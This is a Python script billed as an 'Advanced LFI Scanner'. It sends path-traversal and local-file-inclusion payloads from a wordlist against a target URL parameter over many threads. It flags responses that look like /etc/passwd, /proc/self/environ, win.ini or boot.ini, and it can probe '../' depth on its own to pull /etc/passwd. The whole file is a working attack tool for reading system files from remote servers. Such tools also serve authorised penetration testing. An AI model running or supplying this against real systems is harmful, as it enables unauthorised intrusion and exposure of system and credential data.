import requests
import argparse
import os
import re
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from colorama import Fore, Style
import time

print_lock = threading.Lock()
found_results = False

# Common error page indicators
ERROR_INDICATORS = [
    "error", "not found", "forbidden", "access denied",
    "internal server error", "404", "403", "500"
]

# Common file content indicators
FILE_INDICATORS = {
    "/etc/passwd": ["root:x:", "daemon:x:", "bin:x:"],
    "/etc/hosts": ["localhost", "127.0.0.1"],
    "/proc/self/environ": ["PATH=", "USER=", "HOME="],
    "win.ini": ["[extensions]", "[mci extensions]"],
    "boot.ini": ["[boot loader]", "[operating systems]"]
}

def is_error_page(content):
    """Check if response appears to be an error page"""
    content_lower = content.lower()
    return any(indicator in content_lower for indicator in ERROR_INDICATORS)

def looks_like_file(content, path):
    """Check if response looks like the expected file"""
    filename = os.path.basename(path.lower())
    if filename in FILE_INDICATORS:
        indicators = FILE_INDICATORS[filename]
        return any(indicator in content for indicator in indicators)
    return False

def check_lfi(base_url, payload, min_length):
    """Check a single payload against the target"""
    global found_results
    try:
        full_url = f"{base_url}{payload}"
        
        # Add small delay to avoid rate limiting
        time.sleep(0.1)
        
        response = requests.get(
            full_url,
            timeout=5,
            allow_redirects=False,
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        
        # Skip redirects
        if 300 <= response.status_code < 400:
            return False
            
        content = response.text
        
        # Skip error pages and empty responses
        if is_error_page(content) or len(content) < min_length:
            return False
        
        # Check if this looks like a real file
        is_valid_file = looks_like_file(content, payload)
        
        with print_lock:
            if is_valid_file:
                color = Fore.GREEN
                confidence = "HIGH"
            elif "<?php" in content or "<html" in content:
                color = Fore.RED
                confidence = "LOW (likely HTML)"
            else:
                color = Fore.YELLOW
                confidence = "MEDIUM"
            
            print(f"{color}[+] {response.status_code:3} {len(content):6} {confidence:15} {payload}{Style.RESET_ALL}")
            found_results = True
        
        return is_valid_file
    except Exception as e:
        return False

def lfi_scan(base_url, wordlist_file, min_length, threads=20):
    """Run the threaded LFI scan with improved filtering"""
    global found_results
    
    if not os.path.exists(wordlist_file):
        print(f"[!] Wordlist file {wordlist_file} not found.")
        return

    try:
        with open(wordlist_file, 'r') as f:
            # Sort payloads by likelihood of success
            payloads = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            
            # Prioritize common successful payloads
            priority_payloads = [p for p in payloads if any(
                x in p.lower() for x in ['etc/passwd', 'proc/self', 'win.ini', 'boot.ini'])]
            other_payloads = [p for p in payloads if p not in priority_payloads]
            payloads = priority_payloads + other_payloads
    except Exception as e:
        print(f"[!] Error reading the wordlist: {e}")
        return

    print(f"\n[+] Starting threaded LFI scan ({threads} threads)")
    print(f"[+] Target: {base_url}")
    print(f"[+] Minimum response length: {min_length} chars")
    print(f"[+] Ignoring redirects and error pages\n")
    print(f"{Fore.CYAN}Code  Length  Confidence      Payload{Style.RESET_ALL}")
    print(f"----  ------  ---------------  -------")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_lfi, base_url, payload, min_length) 
                 for payload in payloads]
        
        for _ in as_completed(futures):
            pass  # Results are printed within check_lfi

    if not found_results:
        print(f"{Fore.RED}[-] No valid results found (after filtering){Style.RESET_ALL}")

def find_traversal_depth(base_url, target_file="/etc/passwd", max_depth=10):
    print(f"[+] Trying to detect traversal depth for {target_file}...")
    for depth in range(1, max_depth + 1):
        traversal = "../" * depth + target_file
        full_url = f"{base_url}{traversal}"
        try:
            response = requests.get(full_url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
            if response.status_code == 200 and "root:x:0:0:" in response.text:
                print(f"\n{Fore.GREEN}[✓] Found {target_file} at depth {depth}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[✓] Payload: {traversal}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[✓] URL: {full_url}\n{Style.RESET_ALL}")
                return traversal
        except Exception:
            continue
    print(f"{Fore.RED}[-] Could not detect traversal depth.{Style.RESET_ALL}")
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced LFI Scanner")
    parser.add_argument("-t", "--target", required=True, help="Target URL with parameter (e.g., http://example.com/page.php?file=)")
    parser.add_argument("-w", "--wordlist", default="/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt", help="Path to LFI wordlist")
    parser.add_argument("-l", "--length", type=int, default=100, help="Minimum response length to consider (default: 100)")
    parser.add_argument("--threads", type=int, default=20, help="Number of threads (default: 20)")
    parser.add_argument("--auto-depth", action="store_true", help="Automatically detect LFI traversal depth")
    parser.add_argument("--output", help="File to save valid results")

    args = parser.parse_args()

    if "=" not in args.target:
        print(f"{Fore.RED}[!] Target URL should include parameter (e.g., http://example.com/page.php?file=){Style.RESET_ALL}")
        exit()
    
    if args.auto_depth:
        result = find_traversal_depth(args.target)
        if result:
            print(f"{Fore.GREEN}[+] You can now run with this payload in your wordlist or use manually.{Style.RESET_ALL}")
        exit()
    
    lfi_scan(args.target, args.wordlist, args.length, args.threads)
    print("\n[+] Scan completed")